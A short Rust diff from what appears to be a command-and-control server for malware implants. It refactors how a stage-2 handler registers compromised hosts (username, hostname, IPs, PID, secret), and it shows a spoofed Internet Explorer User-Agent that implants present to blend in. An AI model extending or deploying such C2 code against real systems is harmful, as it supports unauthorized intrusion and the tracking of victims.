@@ -6,7 +6,7 @@ use std::path::PathBuf;
 use std::sync::{Arc, Mutex};
 use uuid::Uuid;
 
-use crate::links::Links;
+use crate::links::{Links, NewLink};
 
 /// User-Agent that all implants must present.
 const IMPLANT_UA: &str = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko";
@@ -171,15 +171,15 @@ pub async fn stage2_handler(
             hex::encode(rand::random::<[u8; 32]>())
         });
 
-    let link = links.add_link(
+    let link = links.add_link(NewLink {
         username,
         hostname,
         internal_ip,
         external_ip,
         platform,
-        body.pid,
+        pid: body.pid,
         secret,
-    );
+    });
 
     let resp = TaskResponse {
         q: String::new(),
